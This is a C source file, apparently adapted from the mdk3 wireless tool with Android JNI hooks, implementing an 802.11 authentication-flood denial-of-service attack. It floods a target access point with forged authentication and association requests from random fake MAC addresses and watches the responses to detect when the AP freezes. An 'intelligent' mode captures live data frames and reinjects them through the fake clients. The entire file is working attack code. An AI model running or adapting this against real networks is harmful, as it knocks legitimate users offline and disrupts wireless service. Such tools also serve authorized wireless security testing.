#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <inttypes.h>


#include "myauth_dos.h"
#include <osdep.h>
#include "helpers.h"
#include "linkedlist.h"
#include <osdep/byteorder.h>
#include "infomessage.h"
#include "authfloodstop.h"

#define AUTH_DOS_MODE 'a'
#define AUTH_DOS_NAME "Authentication Denial-Of-Service"

#define AUTH_DOS_STATUS_NEW	0
#define AUTH_DOS_STATUS_UP	1
#define AUTH_DOS_STATUS_FROZEN	2
#define AUTH_DOS_STATUS_AUTHED	1
#define AUTH_DOS_STATUS_READY	2
static char *status_codes[3] = {"No Response", "Working", "Frozen"};

const unsigned long max_data_size = 33554432L;	// mdk will store up to 32 MB of captured traffic

struct auth_dos_options {
  struct ether_addr *target;
  unsigned char valid_mac;
  unsigned char intelligent;
  unsigned int speed;
};

struct ia_stats
{
  unsigned int c_authed;
  unsigned int c_assoced;
  unsigned int c_kicked;
  unsigned int c_created;
  unsigned int c_denied;

  unsigned int d_captured;
  unsigned int d_sent;
  unsigned int d_responses;
  unsigned int d_relays;
} ia_stats;

//Global things, shared by packet creation and stats printing
pthread_t *sniffer = NULL;
struct clistauthdos *aps = NULL, *increment_here = NULL, *cl = NULL;
unsigned int apcount = 0;
struct ether_addr client, bssid;
struct clist *dataclist = NULL;
uint8_t *p;




void *auth_dos_parse(char* ap_mac, int intelligent) {
  int opt;
  struct auth_dos_options *aopt = malloc(sizeof(struct auth_dos_options));
  
  aopt->target = NULL;
  aopt->valid_mac = 0;
  aopt->intelligent = intelligent;
  aopt->speed = 0;

  aopt->target = malloc(sizeof(struct ether_addr));
  *(aopt->target) = parse_mac(ap_mac);
  
  return (void *) aopt;
}


void auth_dos_sniffer(void *target) {
  struct packet sniffed;
  struct ieee_hdr *hdr;
  struct ether_addr *bssid, *dup;
  struct clistauthdos *curap;
  static struct ether_addr dupdetect;
  char myy_info_buffer[1024];
  JNIEnv* env;

  (*jvm)->AttachCurrentThread(jvm, &env, NULL);

  if (target) aps = add_to_clistauthdos(aps, *((struct ether_addr *) target), AUTH_DOS_STATUS_NEW, 0, 0);
  
  while(1) {
    if(stop_attackauthflood)
      break;
    sniffed = osdep_read_packet();
    if (sniffed.len == 0) exit(-1);
    
    dup = get_destination(&sniffed);
    if (MAC_MATCHES(dupdetect, *dup)) continue;  //Duplicate ignored
    MAC_COPY(dupdetect, *dup);
    
    //Check for APs in status UP and missing over 500!
    if (aps) {
      curap = aps;
      do {
	if ((curap->status == AUTH_DOS_STATUS_UP) && (curap->missing > 500)) {
        if(stop_attackauthflood)
          break;

  //printf("\rCurrent MAC: "); print_mac(bssid);

  
    snprintf(myy_info_buffer, sizeof(myy_info_buffer), "AP has stopped responding and seems to be frozen after %d clients.\n", curap->responses);
    info_message_thread(myy_info_buffer, UPDATE_SUCCESS, env);

	  printf("\rAP "); print_mac(curap->ap); printf(" has stopped responding and seems to be frozen after %d clients.\n", curap->responses);
	  curap->status = AUTH_DOS_STATUS_FROZEN;
	}
	curap = curap->next;
      } while (curap != aps);
    }
    if(stop_attackauthflood)
          break;
    hdr = (struct ieee_hdr *) sniffed.data;
    bssid = get_bssid(&sniffed);
    curap = search_ap(aps, *bssid);
    
    /* WE ONLY USE FIXED TARGETS
    if (! target) {	//We don't care about other APs when there is a fixed target
      if (hdr->type == IEEE80211_TYPE_BEACON) {
	if (! curap) { //New AP!
	  aps = add_to_clistauthdos(aps, *bssid, AUTH_DOS_STATUS_NEW, 0, 0);
	  apcount++;
	  printf("\rFound new target AP "); print_mac(*bssid); printf("         \n");
	}
      }
    }
    */

 //Check for APs in status UP and missing over 500!
  

    if ((hdr->type == IEEE80211_TYPE_AUTH) && curap) {
      struct auth_fixed *authpack = (struct auth_fixed *) (sniffed.data + sizeof(struct ieee_hdr));
      
      if (authpack->seq == htole16((uint16_t) 2)) {
	if (authpack->status == 0) {
	  curap->responses++;
	  if (curap->status == AUTH_DOS_STATUS_NEW) {

      snprintf(myy_info_buffer, sizeof(myy_info_buffer), "AP is responding.\n");
      info_message_thread(myy_info_buffer, UPDATE_RUNNING, env);
	    printf("\rAP "); print_mac(*bssid); printf(" is responding.              \n");
	    curap->status = AUTH_DOS_STATUS_UP;
	    curap->missing = 0;
	  } else if ((curap->status == AUTH_DOS_STATUS_UP) && (! (curap->responses % 500))) {
       snprintf(myy_info_buffer, sizeof(myy_info_buffer), "AP is currently handling %d clients.\n", curap->responses);
       info_message_thread(myy_info_buffer, UPDATE_RUNNING, env);
	     printf("\rAP "); print_mac(*bssid); printf(" is currently handling %d clients.\n", curap->responses);
	  }
	  if (curap->status == AUTH_DOS_STATUS_FROZEN) {
      snprintf(myy_info_buffer, sizeof(myy_info_buffer), "AP is accepting connections again!\n");
       info_message_thread(myy_info_buffer, UPDATE_RUNNING, env);
	    printf("\rAP "); print_mac(*bssid); printf(" is accepting connections again!\n");
	    curap->status = AUTH_DOS_STATUS_UP;
	    curap->missing = 0;
	    curap->responses = 1;
	  }
	} else {
	  if (curap->status != AUTH_DOS_STATUS_FROZEN) {
      snprintf(myy_info_buffer, sizeof(myy_info_buffer), "AP is reporting ERRORs and denies connections after %d clients!\n", curap->responses);
       info_message_thread(myy_info_buffer, UPDATE_SUCCESS, env);
	    printf("\rAP "); print_mac(*bssid); printf(" is reporting ERRORs and denies connections after %d clients!\n", curap->responses);
	    curap->status = AUTH_DOS_STATUS_FROZEN;
	  }
	}
      }
    }
  }

  
  (*jvm)->DetachCurrentThread(jvm);
  

}


void auth_dos_intelligent_sniffer(void *target) {
  struct clistauthdos *search;
  unsigned long data_size = 0;
  char size_warning = 0;
  struct packet pkt;
  struct ether_addr *src, *dest, *bssid, *target_ap = (struct ether_addr *) target;
  struct ieee_hdr *hdr;
  struct auth_fixed *af;
  char myy_info_buffer[1024];
  JNIEnv* env;

  (*jvm)->AttachCurrentThread(jvm, &env, NULL);

  while (1) {

    if(stop_attackauthflood)
          break;
    pkt = osdep_read_packet();
    if (pkt.len == 0) exit(-1);
    
    bssid = get_bssid(&pkt);
    dest = get_destination(&pkt);
    
    if (! MAC_MATCHES(*bssid, *target_ap)) continue;	// skip packets from other sources

    hdr = (struct ieee_hdr *) pkt.data;
    
    switch (hdr->type) {

      case IEEE80211_TYPE_AUTH:
	// Authentication Response
	af = (struct auth_fixed *) (pkt.data + sizeof(struct ieee_hdr));
	if (af->status != AUTH_STATUS_SUCCESS) {
	  ia_stats.c_denied++;
	  break;
	}
	search = search_ap(cl, *dest);
	if (search == NULL) break;
	if (search->status < AUTH_DOS_STATUS_AUTHED) {	//prevent problems since many APs send multiple responses
	  search->status = AUTH_DOS_STATUS_AUTHED;
	  ia_stats.c_authed++;
	}
	break;

	case IEEE80211_TYPE_ASSOCRES:
	  // Association Response
	  // We don't care if its successful, we just send data to let the AP do some work when deauthing the fake client again
	  search = search_ap(cl, *dest);
	  if (search == NULL) break;
	  if (search->status < AUTH_DOS_STATUS_READY) {	//prevent problems since many APs send multiple responses
	    search->status = AUTH_DOS_STATUS_READY;
	    ia_stats.c_assoced++;
	  }
	  break;

	case IEEE80211_TYPE_DEAUTH:
	case IEEE80211_TYPE_DISASSOC:
	  // Deauth and Disassociation (fake client gets kicked)
	  search = search_ap(cl, *dest);
	  if (search == NULL) break;
	  if (search->status != AUTH_DOS_STATUS_NEW) {	//Count only one deauth if the AP does flooding
	    search->status = AUTH_DOS_STATUS_NEW;
	    ia_stats.c_kicked++;
	  }
	  break;

	case IEEE80211_TYPE_DATA:
	case IEEE80211_TYPE_QOSDATA:
	  src = get_source(&pkt);

	  // Check if packet got relayed (source adress == fake mac)
	  search = search_ap(cl, *src);
	  if (search != NULL) {
	    ia_stats.d_relays++;
	    break;
	  }

	  // Check if packet is an answer to an injected packet (destination adress == fake mac)
	  search = search_ap(cl, *dest);
	  if (search != NULL) {
	    ia_stats.d_responses++;
	    break;
	  }

	  // If it's none of these, check if the maximum lenght is exceeded
	  if (data_size < max_data_size) {
	    if ((pkt.data[1] & 3) != 3) {	// Ignore WDS packets, too lazy to move data around in there
	      dataclist = add_to_clist(dataclist, pkt.data, pkt.len, pkt.len);
	      // increase ia_stats captured counter & data_size
	      ia_stats.d_captured++;
	      data_size += pkt.len;
	    }
	  } else {
	    if (!size_warning) {
	      printf("--------------------------------------------------------------\n");
	      printf("WARNING: mdk3 has now captured more than %ld MB of data packets\n", max_data_size / 1024 / 1024);
	      printf("         New data frames will be ignored to save memory!\n");
	      printf("--------------------------------------------------------------\n");

        snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Max data of %ld MB captured. New data frames will be ignored!\n", max_data_size / 1024 / 1024);
        info_message_thread(myy_info_buffer, UPDATE_ERROR, env);
	      size_warning = 1;
	    }
	  }
	  

	default:
	    // Not interesting, count something???
	    break;
	}
    }

    (*jvm)->DetachCurrentThread(jvm);
}

struct ether_addr auth_dos_get_target() {
  struct clistauthdos *start;
  char frozen_only = 1;
  unsigned int apnr, i;
  static unsigned int select_any = 0;
  char myy_info_buffer[1024];

  while (aps == NULL) {
    printf("\rWaiting for targets...               \n");
    snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Waiting for targets...\n");
        info_message(myy_info_buffer, UPDATE_RUNNING);
    sleep(1);
  }
  
  start = aps;
  do {
    if (start->status != AUTH_DOS_STATUS_FROZEN) {
      frozen_only = 0;
      break;
    }
    start = start->next;
  } while (start != aps);
  
  if (frozen_only) {
    //printf("\rAll APs in range seem to be frozen, selecting one of them nonetheless.\n"); //Too much blah blah
    apnr = random() % apcount;
    start = aps;
    for(i=0; i<apnr; i++) start = start->next;
    increment_here = start;
    return start->ap;
  }
  
  select_any++;
  apnr = random() % apcount;
  start = aps;
  for(i=0; i<apnr; i++) start = start->next;
  if (select_any % 3) while (start->status == AUTH_DOS_STATUS_FROZEN) start = start->next; //every third round, frozen APs will also be targeted
  increment_here = start;
  return start->ap;
}


struct packet auth_dos_get_data(struct ether_addr client, struct ether_addr bssid) {
  struct packet retn;
  struct ether_addr *dst, *src, *bss;
  struct ieee_hdr *hdr;
    
  //NOTE: ToDS frames are being reinjected with the source address of one of the fake nodes
  //      FromDS frames are being rebroadcastet by setting ToDS flag + Broadcast destination
    
  //Skip some packets for variety
  dataclist = dataclist->next;
  dataclist = dataclist->next;

  //Copy packet out of the list
  memcpy(retn.data, dataclist->data, dataclist->data_len);
  retn.len = dataclist->data_len;
  
  hdr = (struct ieee_hdr *) retn.data;
  
  if (hdr->flags | 0x01) { //ToDS set -> reinject with fake source
    src = get_source(&retn);
    *src = client;
  } else { //FromDS -> set ToDS, and rebuild all MAC addresses
    hdr->flags &= 0xFC;	// Clear DS field
    hdr->flags |= 0x01;	// Set ToDS bit
    src = get_source(&retn);
    dst = get_destination(&retn);
    bss = get_bssid(&retn);
    *src = client;
    *bss = bssid;
    MAC_SET_BCAST(*dst);
  }

  return retn;
}


struct packet auth_dos_intelligent_getpacket(struct auth_dos_options *aopt) {
  struct clistauthdos *search;
  static int oldclient_count = 0;
  static char *ssid;
  struct ether_addr fmac, *ap;
  struct packet beacon, pkt;
  struct ieee_hdr *hdr;
  static uint16_t capabilities;
  char myy_info_buffer[1024];

  if (! cl) {
    // Building first fake client to initialize list
    if (aopt->valid_mac) fmac = generate_mac(MAC_KIND_CLIENT);
      else fmac = generate_mac(MAC_KIND_RANDOM);
    cl = add_to_clistauthdos(cl, fmac, AUTH_DOS_STATUS_NEW, 0, 0);
    
    // Setting up statistics counters
    ia_stats.c_authed = 0;
    ia_stats.c_assoced = 0;
    ia_stats.c_kicked = 0;
    ia_stats.c_created = 1;	//Has been created while initialization
    ia_stats.d_captured = 0;
    ia_stats.d_sent = 0;
    ia_stats.d_responses = 0;
    ia_stats.d_relays = 0;

    // Starting the response sniffer
    if (! sniffer) {
      sniffer = malloc(sizeof(pthread_t));
      pthread_create(sniffer, NULL, (void *) auth_dos_intelligent_sniffer, (void *) aopt->target);
    }

    // Sniff one beacon frame to read the capabilities of the AP
    snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Sniffing one beacon frame to read capabilities and SSID...\n");
    info_message(myy_info_buffer, UPDATE_RUNNING);
    printf("Sniffing one beacon frame to read capabilities and SSID...\n");
    while (1) {
      if(stop_attackauthflood)
          break;
      beacon = osdep_read_packet();
      if (beacon.len == 0) break;
      hdr = (struct ieee_hdr *) beacon.data;
      if (hdr->type == IEEE80211_TYPE_BEACON) {
        ap = get_bssid(&beacon);
        if (MAC_MATCHES(*ap, *(aopt->target))) {
	  ssid = get_ssid(&beacon, NULL);
	  capabilities = get_capabilities(&beacon);
    snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Capabilities are: 0x%04X\n", capabilities);
    info_message(myy_info_buffer, UPDATE_SUCCESS);
    snprintf(myy_info_buffer, sizeof(myy_info_buffer), "SSID is: %s\n", ssid);
    info_message(myy_info_buffer, UPDATE_SUCCESS);
	  printf("Capabilities are: 0x%04X\n", capabilities);
	  printf("SSID is: %s\n", ssid);
	  break;
	}
      }
    }
  }
  if(stop_attackauthflood)
      return pkt;
  // Skip some clients for more variety
  cl = cl->next;
  cl = cl->next;

  if (oldclient_count < 30) {
    // Make sure that mdk3 doesn't waste time reauthing kicked clients or keeping things alive
    // Every 30 injected packets, it should fake another client
    oldclient_count++;

    search = search_authdos_status(cl->next, AUTH_DOS_STATUS_AUTHED);
    if (search != NULL) {
      //there is an authed client that needs to be associated
      //printf("\rAssociating authenticated client "); print_mac(search->ap); printf("\n");
      pkt = create_assoc_req(search->ap, *(aopt->target), capabilities, ssid, 54);
      if (aopt->speed) sleep_till_next_packet(aopt->speed);
      return pkt;
    }

    search = search_authdos_status(cl->next, AUTH_DOS_STATUS_READY);
    if (search != NULL) {
      //there is a fully authed client that should send some data to keep it alive
      if (dataclist) {
	//printf("\rSending fake data via client "); print_mac(search->ap); printf("\n");
	ia_stats.d_sent++;
	pkt = auth_dos_get_data(search->ap, *(aopt->target));
	if (aopt->speed) sleep_till_next_packet(aopt->speed);
	return pkt;
      }
    }
  }

  // We reach here if there either were too many or no old clients
  search = NULL;

  // Search for a kicked client if we didn't reach our limit yet
  if (oldclient_count < 30) {
    oldclient_count++;
    search = search_authdos_status(cl, AUTH_DOS_STATUS_NEW);
    //if (search) { printf("\rAuthenticating disconnected client "); print_mac(search->ap); printf("\n"); }
  }
  // And make a new one if none is found
  if (search == NULL) {
    if (aopt->valid_mac) fmac = generate_mac(MAC_KIND_CLIENT);
      else fmac = generate_mac(MAC_KIND_RANDOM);
    search = add_to_clistauthdos(cl, fmac, AUTH_DOS_STATUS_NEW, 0, 0);
    //printf("\rCreating new client "); print_mac(search->ap); printf("\n");
    ia_stats.c_created++;
    oldclient_count = 0;
  }

  // Authenticate the new/kicked clients
  pkt = create_auth(*(aopt->target), search->ap, 0x0001);
  if (aopt->speed) sleep_till_next_packet(aopt->speed);
  return pkt;
}


struct packet auth_dos_getpacket(void *options) {
  struct auth_dos_options *aopt = (struct auth_dos_options *) options;
  struct packet pkt;
  static unsigned int nb_sent = 0;
  static time_t t_prev = 0;
  char myy_info_buffer[1024];

  if (aopt->intelligent) return auth_dos_intelligent_getpacket(aopt);

  if (! sniffer) {
    sniffer = malloc(sizeof(pthread_t));
    pthread_create(sniffer, NULL, (void *) auth_dos_sniffer, (void *) aopt->target);
  }
  
  if (! aopt->target) {
     if ((nb_sent % 1024 == 0) || ((time(NULL) - t_prev) >= 5)) {
       t_prev = time(NULL);
       bssid = auth_dos_get_target();
       //printf("\rSelected new target "); print_mac(bssid); printf("          \n"); // ToO much blah blah
     }
  } else {
    bssid = *(aopt->target);
    increment_here = search_ap(aps, bssid);
  }

  if (aopt->valid_mac) client = generate_mac(MAC_KIND_CLIENT);
  else client = generate_mac(MAC_KIND_RANDOM);
  
  pkt = create_auth(bssid, client, 1);
  
  if (aopt->speed) sleep_till_next_packet(aopt->speed);

  nb_sent++;
  if (increment_here) increment_here->missing++;  //This gets reset once a response comes in

  return pkt;
}

void auth_dos_print_stats(void *options) {
  struct auth_dos_options *aopt = (struct auth_dos_options *) options;
  char myy_info_buffer[1024];

  if(aopt->intelligent) {
    snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Clients: Created: %4d   Authenticated: %4d   Associated: %4d   Denied: %4d   Got Kicked: %4d\n",
      ia_stats.c_created, ia_stats.c_authed, ia_stats.c_assoced, ia_stats.c_denied, ia_stats.c_kicked);
    info_message(myy_info_buffer, UPDATE_RUNNING);
    snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Data: Captured: %4d   Sent: %4d   Responses: %4d   Relayed: %4d\n\n",
      ia_stats.d_captured, ia_stats.d_sent, ia_stats.d_responses, ia_stats.d_relays);
    info_message(myy_info_buffer, UPDATE_RUNNING);
    printf("\rClients: Created: %4d   Authenticated: %4d   Associated: %4d   Denied: %4d   Got Kicked: %4d\n",
	    ia_stats.c_created, ia_stats.c_authed, ia_stats.c_assoced, ia_stats.c_denied, ia_stats.c_kicked);
    printf("Data   : Captured: %4d   Sent: %4d   Responses: %4d   Relayed: %4d\n",
	    ia_stats.d_captured, ia_stats.d_sent, ia_stats.d_responses, ia_stats.d_relays);
  } else {
    p = client.ether_addr_octet;
    snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Connecting Client %02X:%02X:%02X:%02X:%02X:%02X\n", p[0], p[1], p[2], p[3], p[4], p[5]);
    info_message(myy_info_buffer, UPDATE_RUNNING);

    p = bssid.ether_addr_octet;
    snprintf(myy_info_buffer, sizeof(myy_info_buffer), "to target AP %02X:%02X:%02X:%02X:%02X:%02X\n\n", p[0], p[1], p[2], p[3], p[4], p[5]);
    info_message(myy_info_buffer, UPDATE_RUNNING);

    printf("\rConnecting Client "); print_mac(client);
    printf(" to target AP "); print_mac(bssid);
    struct clistauthdos *search = search_ap(aps, bssid);
    if (search) {
      snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Status: %s.\n", status_codes[search->status]);
      info_message(myy_info_buffer, UPDATE_RUNNING);
      printf(" Status: %s.\n", status_codes[search->status]);
    } else {
      printf(".\n");
    }
  }
}

void auth_dos_perform_check(void *options) {
  //unused
  options = options; //prevent warning
}

struct attacks load_auth_dos() {
  struct attacks this_attack;
  char *auth_dos_name = malloc(strlen(AUTH_DOS_NAME) + 1);
  strcpy(auth_dos_name, AUTH_DOS_NAME);

  this_attack.parse_options = (fpo) auth_dos_parse;
  this_attack.get_packet = (fpp) auth_dos_getpacket;
  this_attack.print_stats = (fps) auth_dos_print_stats;
  this_attack.perform_check = (fps) auth_dos_perform_check;
  this_attack.mode_identifier = AUTH_DOS_MODE;
  this_attack.attack_name = auth_dos_name;

  return this_attack;
}
